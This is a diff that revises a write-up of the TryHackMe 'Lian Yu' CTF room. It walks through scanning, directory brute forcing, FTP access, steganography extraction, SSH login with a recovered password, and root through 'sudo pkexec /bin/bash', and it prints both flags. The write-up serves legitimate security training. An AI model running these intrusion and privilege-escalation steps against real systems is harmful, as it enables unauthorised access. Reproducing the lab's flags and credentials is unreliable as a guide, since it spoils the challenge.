@@ -13,11 +13,12 @@
 
 Lian Yu is a TryHackMe CTF inspired by *Arrow (Deathstroke / Slade Wilson storyline)*.  
 This machine focuses on:
-- Enumeration
-- Hidden directories
-- Steganography
-- Credential harvesting
-- Privilege escalation
+
+- Enumeration  
+- Hidden directories  
+- Steganography  
+- Credential harvesting  
+- Privilege escalation  
 
 ---
 
@@ -25,7 +26,7 @@ This machine focuses on:
 
 ## 🔍 Nmap Scan
 
-Run a full scan to identify open ports and services.
+Run a full scan to identify open ports and services:
 
 ```bash
 nmap -sC -sV -A 10.48.137.137
@@ -36,131 +37,103 @@ nmap -sC -sV -A 10.48.137.137
 111/tcp – rpcbind
 
 👉 Key takeaway:
-We have FTP + Web + SSH, meaning initial foothold likely from FTP or web.
+We have FTP + Web + SSH → initial access likely via FTP or web enumeration.
 
 🌐 STEP 2: Web Enumeration
 🔧 Gobuster Scan
-
-We scan for hidden directories on the web server.
-
 gobuster dir -u http://10.48.137.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 📌 Findings
 /island
 /server-status (403 Forbidden)
 
-Now we dig deeper into /island.
+👉 We focus on /island.
 
 🌐 STEP 3: Deep Web Enumeration
-🔍 Inside /island
-
-We fuzz deeper inside:
-
+🔍 Directory Found
 /island/2100
-
-We also discover a hidden file:
-
+📄 Hidden File
 /green_arrow.ticket
 
-👉 Key takeaway:
-The number 2100 becomes important later.
+👉 Hint: number 2100 becomes important later.
 
 📂 STEP 4: FTP Enumeration
 🔐 Login to FTP
 ftp 10.48.165.72
 Credentials:
 Username: vigilante
-Password: (provided in challenge / guessed / discovered)
-📁 Directory Listing
-
-We find several files:
-
+Password: (provided/derived during challenge)
+📁 Files Found
 Leave_me_alone.png
 Queen's_Gambit.png
 aa.jpg
-.other_user (hidden file)
+.other_user
 📥 Download Files
 mget *
-
-👉 Now we analyze downloaded files locally.
-
 🕵️ STEP 5: Hidden File Analysis
-📄 Check Hidden File
+📄 Read Hidden File
 cat .other_user
-🧠 Result:
+🧠 Result
 
-We find lore about Slade Wilson (Deathstroke).
+Lore about Slade Wilson (Deathstroke).
 
-👉 This confirms theme + hints at identity-based password clues.
+👉 Hint: username for SSH = slade
 
 🧩 STEP 6: Steganography Extraction
-🖼️ Extract Hidden Data from Image
-
-We check aa.jpg.
-
+🖼️ Extract Hidden Data
 steghide --extract -sf aa.jpg
-🔐 Passphrase (found via hints)
-(empty / guessed / derived from context)
 📦 Output
 ss.zip
-📂 Extract ZIP File
+📂 Unzip File
 unzip ss.zip
-Files extracted:
+📁 Extracted Files
 passwd.txt
 shado
-🔍 Check Files
+🔍 Check Password File
 cat shado
-🧠 Result:
+🧠 Result
 M3tahuman
 
-👉 This is our SSH password clue
+👉 SSH password discovered.
 
 🔑 STEP 7: SSH Login
-🔐 Connect via SSH
 ssh slade@10.48.137.137
 Password:
 M3tahuman
-✅ Success Login Message
 
-We successfully gain access as user slade.
+✔ Successful login as user slade
 
 👤 STEP 8: User Flag
-📄 Read user flag
 cat user.txt
-🏁 Result:
+🏁 Flag:
 THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
 ⚙️ STEP 9: Privilege Escalation
 🔍 Check sudo permissions
 sudo -l
-Output:
+📌 Result:
 (root) PASSWD: /usr/bin/pkexec
-
-👉 Key insight:
-We can run pkexec as root.
-
 💥 Exploit
 sudo -u root /usr/bin/pkexec /bin/bash
-👑 We are ROOT now
+
+✔ Root shell obtained
+
 👑 STEP 10: Root Flag
-📄 Capture root flag
 cat root.txt
-🏁 Result:
+🏁 Flag:
 THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
 🧾 SUMMARY
 🛠️ Skills Used
 Nmap scanning
-Gobuster directory brute force
-FTP enumeration
+Gobuster enumeration
+FTP exploitation
 Hidden file discovery
 Steganography (steghide)
-SSH login
+SSH access
 Privilege escalation (pkexec abuse)
 💬 CONCLUSION
 
-This machine teaches the importance of:
+This machine demonstrates that:
 
-Deep enumeration
-Checking hidden files
-Analyzing images for hidden data
-Privilege escalation awareness
-
-Even simple hints can lead to full system compromise.
+Small hints = big breakthroughs
+Hidden files are critical
+Steganography is often key
+Misconfigured sudo = full system compromise
